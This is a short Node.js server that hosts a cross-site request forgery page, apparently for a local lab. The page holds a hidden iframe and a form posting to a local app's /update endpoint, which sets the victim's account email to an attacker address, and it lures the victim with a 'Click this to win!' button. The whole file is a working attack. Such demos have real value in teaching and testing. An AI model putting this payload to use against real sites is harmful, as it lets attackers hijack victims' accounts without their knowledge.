const http = require("http");

const attackerEmail = "attacker@example.com";

const server = http.createServer((req, res) => {
  res.writeHead(200, { "Content-Type": "text/html" });
  res.end(`
<iframe name=hide style="position:absolute;left:-1000px"></iframe>
<form method="post" action="http://localhost:3000/update" target=hide>
<input type=hidden name=email value="${attackerEmail}">
<input type=submit value="Click this to win!">
</form>`);
});

server.listen(3001, () => {
  console.log("Server listening on port 3001");
});
